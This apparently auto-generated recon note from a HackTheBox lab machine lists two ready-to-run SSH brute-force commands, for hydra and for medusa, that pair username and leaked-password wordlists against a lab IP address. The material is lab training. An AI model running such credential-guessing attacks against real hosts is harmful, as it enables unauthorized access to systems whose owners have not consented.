```bash
[*] ssh on tcp/22

	[-] Bruteforce logins:

		hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 22 -o "/home/kali/Documents/HTB-Notes/PC/scanned_recon/10.129.103.74/scans/tcp22/tcp_22_ssh_hydra.txt" ssh://10.129.103.74

		medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 22 -O "/home/kali/Documents/HTB-Notes/PC/scanned_recon/10.129.103.74/scans/tcp22/tcp_22_ssh_medusa.txt" -M ssh -h 10.129.103.74


```